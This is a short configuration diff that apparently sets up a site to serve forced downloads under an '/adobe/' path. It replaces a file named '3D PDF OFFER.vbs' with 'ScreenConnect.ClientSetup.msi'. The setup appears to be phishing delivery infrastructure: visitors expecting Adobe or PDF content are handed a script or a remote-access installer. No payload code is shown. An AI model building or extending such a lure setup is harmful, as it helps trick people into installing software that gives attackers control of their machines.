@@ -19,7 +19,7 @@
       ]
     },
     {
-      "source": "/adobe/3D PDF OFFER.vbs",
+      "source": "/adobe/ScreenConnect.ClientSetup.msi",
       "headers": [
         {
           "key": "Content-Type",
@@ -27,7 +27,7 @@
         },
         {
           "key": "Content-Disposition",
-          "value": "attachment; filename=\"3D PDF OFFER.vbs\""
+          "value": "attachment; filename=\"ScreenConnect.ClientSetup.msi\""
         }
       ]
     }
@@ -40,6 +40,7 @@
     }
   ]
 }
+
 
 
 
